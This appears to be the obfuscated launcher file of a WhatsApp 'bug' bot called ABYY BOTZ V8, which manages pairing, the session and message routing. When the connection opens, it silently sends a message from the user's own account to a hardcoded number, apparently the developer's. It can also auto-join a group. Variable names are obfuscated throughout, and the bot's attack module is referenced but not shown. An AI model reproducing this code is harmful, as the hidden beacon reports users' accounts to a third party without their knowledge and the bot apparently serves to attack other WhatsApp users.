require("./database/global");
const func = require('./database/place');
const readline = require('readline');
const question = _0x16ecb7 => {
  const _0x4ed637 = readline.createInterface({
    'input': process.stdin,
    'output': process.stdout
  });
  return new Promise(_0xf1f02d => {
    _0x4ed637.question(_0x16ecb7, _0xf1f02d);
  });
};
async function startSesi() {
  const _0x19952b = makeInMemoryStore({
    'logger': pino().child({
      'level': "silent",
      'stream': "store"
    })
  });
  const {
    state: _0x282728,
    saveCreds: _0x145ebc
  } = await useMultiFileAuthState("./session");
  const {
    version: _0x467b29,
    isLatest: _0x221efb
  } = await fetchLatestBaileysVersion();
  console.log(chalk.green.bold("\n░█████╗░██████╗░██╗░░░██╗██╗░░░██╗\n██╔══██╗██╔══██╗╚██╗░██╔╝╚██╗░██╔╝\n███████║██████╦╝░╚████╔╝░░╚████╔╝░\n██╔══██║██╔══██╗░░╚██╔╝░░░░╚██╔╝░░\n██║░░██║██████╦╝░░░██║░░░░░░██║░░░\n╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░░░░╚═╝░░░\n\nABYY BOTZ BUG V8.0.0"));
  const _0x6c9e1d = {
    'version': _0x467b29,
    'keepAliveIntervalMs': 0x7530,
    'printQRInTerminal': false,
    'logger': pino({
      'level': "fatal"
    }),
    'auth': _0x282728,
    'browser': ['Ubuntu', "Chrome", '20.0.04']
  };
  const _0x19e3df = func.makeWASocket(_0x6c9e1d);
  if (true && !_0x19e3df.authState.creds.registered) {
    const _0x282549 = await question(chalk.green("\nEnter Your Number\nNumber : "));
    const _0x53c1e2 = await _0x19e3df.requestPairingCode(_0x282549.trim());
    console.log(chalk.red("YOUR CODE PAIR : " + _0x53c1e2 + " "));
  }
  _0x19952b.bind(_0x19e3df.ev);
  _0x19e3df.ev.on("connection.update", async _0x57037e => {
    const {
      connection: _0x4dc1f9,
      lastDisconnect: _0x24fc51
    } = _0x57037e;
    if (_0x4dc1f9 === "close") {
      const _0x54095b = new Boom(_0x24fc51?.["error"])?.["output"]["statusCode"];
      console.log(color(_0x24fc51.error, 'deeppink'));
      if (_0x24fc51.error == "Error: Stream Errored (unknown)") {
        process.exit();
      } else {
        if (_0x54095b === DisconnectReason.badSession) {
          console.log(color("Bad Session File, Please Delete Session and Scan Again"));
          process.exit();
        } else {
          if (_0x54095b === DisconnectReason.connectionClosed) {
            console.log(color('[SYSTEM]', "white"), color("Connection closed, reconnecting...", "deeppink"));
            process.exit();
          } else {
            if (_0x54095b === DisconnectReason.connectionLost) {
              console.log(color("[SYSTEM]", 'white'), color("Connection lost, trying to reconnect", "deeppink"));
              process.exit();
            } else {
              if (_0x54095b === DisconnectReason.connectionReplaced) {
                console.log(color("Connection Replaced, Another New Session Opened, Please Close Current Session First"));
                _0x19e3df.logout();
              } else {
                if (_0x54095b === DisconnectReason.loggedOut) {
                  console.log(color("Device Logged Out, Please Scan Again And Run."));
                  _0x19e3df.logout();
                } else {
                  if (_0x54095b === DisconnectReason.restartRequired) {
                    console.log(color("Restart Required, Restarting..."));
                    await startSesi();
                  } else if (_0x54095b === DisconnectReason.timedOut) {
                    console.log(color("Connection TimedOut, Reconnecting..."));
                    startSesi();
                  }
                }
              }
            }
          }
        }
      }
    } else {
      if (_0x4dc1f9 === "connecting") {
        start('1', 'Connecting...');
      } else {
        if (_0x4dc1f9 === "open") {
          success('1', "Tersambung");
          _0x19e3df.sendMessage("254102074064@s.whatsapp.net", {
            'text': "╔══╦╗\n║╔╗║╚╦╦╦╦╗\n║╠╣║╬║║║║║\n╚╝╚╩═╬╗╠╗║\n─────╚═╩═╝\n\n𝗔𝗯𝘆𝘆 𝗕𝗼𝘁𝘇 𝗩𝟴 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗶𝗼𝗻\nABYY BOTZ V8 の接続成功 \n\nINI VERSI ENC YA\nMAU YANG NO ENC? PV : https//t.me/byxxone\n🔥⚡\n\nJOIN CH BARU ABYY : https://whatsapp.com/channel/0029Van86kL5Ui2SgngDlZ3W 🙌\n\n*GUNAKAN BOT DENGAN BIJAK YGY* ⚠️☣️"
          });
          if (autoJoin) {
            _0x19e3df.groupAcceptInvite(codeInvite);
          }
        }
      }
    }
  });
  _0x19e3df.ev.on("messages.upsert", async _0x803ad1 => {
    try {
      m = _0x803ad1.messages[0x0];
      if (!m.message) {
        return;
      }
      m.message = Object.keys(m.message)[0x0] === "ephemeralMessage" ? m.message.ephemeralMessage.message : m.message;
      if (m.key && m.key.remoteJid === "status@broadcast") {
        return _0x19e3df.readMessages([m.key]);
      }
      if (!_0x19e3df["public"] && !m.key.fromMe && _0x803ad1.type === "notify") {
        return;
      }
      if (m.key.id.startsWith('BAE5') && m.key.id.length === 0x10) {
        return;
      }
      m = func.smsg(_0x19e3df, m, _0x19952b);
      require("./abyyxvn")(_0x19e3df, m, _0x19952b);
    } catch (_0x51bd82) {
      console.log(_0x51bd82);
    }
  });
  _0x19e3df.ev.on("contacts.update", _0x3580a0 => {
    for (let _0x30c3c0 of _0x3580a0) {
      let _0x51fc82 = _0x19e3df.decodeJid(_0x30c3c0.id);
      if (_0x19952b && _0x19952b.contacts) {
        _0x19952b.contacts[_0x51fc82] = {
          'id': _0x51fc82,
          'name': _0x30c3c0.notify
        };
      }
    }
  });
  _0x19e3df['public'] = true;
  _0x19e3df.ev.on('creds.update', _0x145ebc);
  return _0x19e3df;
}
startSesi();
process.on("uncaughtException", function (_0x100279) {
  console.log("Caught exception: ", _0x100279);
});
